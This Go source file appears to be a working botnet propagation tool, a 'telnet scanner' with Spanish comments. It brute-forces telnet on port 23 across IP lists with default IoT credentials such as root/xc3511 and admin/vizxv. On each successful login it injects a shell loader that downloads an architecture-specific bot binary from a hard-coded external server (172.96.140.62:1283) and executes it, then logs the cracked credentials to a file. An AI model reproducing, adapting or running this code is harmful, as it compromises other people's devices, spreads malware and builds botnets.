package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
}

const (
	TELNET_TIMEOUT    = 5 * time.Second
	MAX_WORKERS       = 2000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 3 * time.Second
)

// PAYLOAD CORREGIDO - CON DETECCIÓN DE ARQUITECTURA Y FALLBACK
const PAYLOAD = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
echo "[*] ===== SYSTEM32 LOADER =====";
echo "[*] Starting download...";
echo "[DEBUG] uname -m: $(uname -m)";

# Detectar arquitectura
a=$(uname -m);
case $a in
    x86_64) b="x86_64/x86_64";;
    i?86|i386) b="x86/x86";;
    armv7l) b="arm7/arm7";;
    armv6l) b="arm6/arm6";;
    armv5l) b="arm5/arm5";;
    aarch64) b="aarch64/aarch64";;
    mips) b="mips/mips";;
    mipsel) b="mipsel/mipsel";;
    *)
        echo "[*] Unknown architecture: $a, trying to detect...";
        if echo "$a" | grep -q "arm"; then
            b="arm7/arm7";
        elif echo "$a" | grep -q "mips"; then
            b="mipsel/mipsel";
        else
            b="x86_64/x86_64";
        fi
        ;;
esac;

# VERIFICACIÓN - Si b está vacío, usar default
if [ -z "$b" ]; then
    echo "[-] Architecture detection failed, using default";
    b="x86_64/x86_64";
fi

# URL CORRECTA
url="http://172.96.140.62:1283/bots/$b";
echo "[*] Architecture: $a -> $b";
echo "[*] Download URL: $url";

# INTENTAR DESCARGA
downloaded=0

# Try wget
if command -v wget >/dev/null 2>&1; then
    echo "[+] Using wget...";
    wget -q -O .x "$url" && echo "[+] wget OK" && downloaded=1;
fi

# Try curl si wget falló
if [ $downloaded -eq 0 ] && command -v curl >/dev/null 2>&1; then
    echo "[+] Using curl...";
    curl -s -o .x "$url" && echo "[+] curl OK" && downloaded=1;
fi

# Try busybox wget
if [ $downloaded -eq 0 ] && busybox wget --help >/dev/null 2>&1; then
    echo "[+] Using busybox wget...";
    busybox wget -q -O .x "$url" && echo "[+] busybox OK" && downloaded=1;
fi

# Try fetch (FreeBSD)
if [ $downloaded -eq 0 ] && command -v fetch >/dev/null 2>&1; then
    echo "[+] Using fetch...";
    fetch -q -o .x "$url" && echo "[+] fetch OK" && downloaded=1;
fi

# Try /dev/tcp (bash only)
if [ $downloaded -eq 0 ] && echo >/dev/tcp/172.96.140.62/1283 2>/dev/null; then
    echo "[+] Using /dev/tcp...";
    exec 3<>/dev/tcp/172.96.140.62/1283;
    echo -e "GET /bots/$b HTTP/1.0\r\nHost: 172.96.140.62\r\n\r\n" >&3;
    cat <&3 > .x;
    exec 3<&-;
    if [ -s .x ]; then
        echo "[+] /dev/tcp OK";
        downloaded=1;
    fi
fi

# Verificar descarga
if [ -f .x ]; then
    SIZE=$(ls -l .x | awk '{print $5}' 2>/dev/null || stat -c %s .x 2>/dev/null);
    echo "[+] File downloaded: .x ($SIZE bytes)";
    
    if [ $SIZE -gt 1000 ]; then
        chmod +x .x && echo "[+] chmod OK";
        echo "[+] Executing binary...";
        ./ .x &
        echo "[+] Binary executed in background";
        echo "[*] LOADER COMPLETED";
    else
        echo "[-] File too small ($SIZE bytes) - download failed";
        rm -f .x;
    fi
else
    echo "[-] Download failed - no file created";
fi
echo "[*] ===== FINISHED ====="`

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			_, err = conn.Write([]byte(PAYLOAD + "\n"))
			if err != nil {
				return false, "write command failed"
			}
			output := s.readCommandOutput(conn)
			return true, CredentialResult{
				Host:     host,
				Username: username,
				Password: password,
				Output:   output,
			}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 2048)
	buf := make([]byte, 2048)
	startTime := time.Now()
	readTimeout := 10 * time.Second

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			break
		}
		if n > 0 {
			data = append(data, buf[:n]...)
		}
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("\n✅ FOUND: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
				if len(credResult.Output) > 0 {
					fmt.Printf("📥 Output: %.100s\n", strings.ReplaceAll(credResult.Output, "\n", " "))
				}
				fmt.Println()
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 Scanned: %d | ✅ Valid: %d | ❌ Invalid: %d | 📥 Queue: %d | 🧵 Routines: %d", 
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     SHIFT/RIVEN TELNET SCANNER         ║")
	fmt.Println("║         VERSIÓN FINAL FUNCIONAL        ║")
	fmt.Println("║      Servidor: 172.96.140.62:1283      ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("CPU Cores: %d\n", runtime.NumCPU())
	fmt.Printf("🔥 Workers: %d | Timeout: %v\n", MAX_WORKERS, TELNET_TIMEOUT)
	fmt.Printf("📦 URL: http://172.96.140.62:1283/bots/ARCH/ARCH\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" && net.ParseIP(host) != nil {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("\n📥 Hosts cargados: %d\n", hostCount)
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	fmt.Println("\n\n✅ SCAN COMPLETADO")
	fmt.Printf("📊 Total escaneados: %d\n", scanned)
	fmt.Printf("✅ Credenciales válidas: %d\n", valid)
	
	if len(s.foundCredentials) > 0 {
		fmt.Println("\n🔑 Credenciales encontradas:")
		for _, cred := range s.foundCredentials {
			fmt.Printf("   • %s | %s:%s\n", cred.Host, cred.Username, cred.Password)
		}
		
		f, _ := os.Create("found.txt")
		defer f.Close()
		for _, cred := range s.foundCredentials {
			fmt.Fprintf(f, "%s:%s:%s\n", cred.Host, cred.Username, cred.Password)
		}
		fmt.Println("\n💾 Resultados guardados en found.txt")
	}
}

func main() {
	scanner := NewTelnetScanner()
	scanner.Run()
}
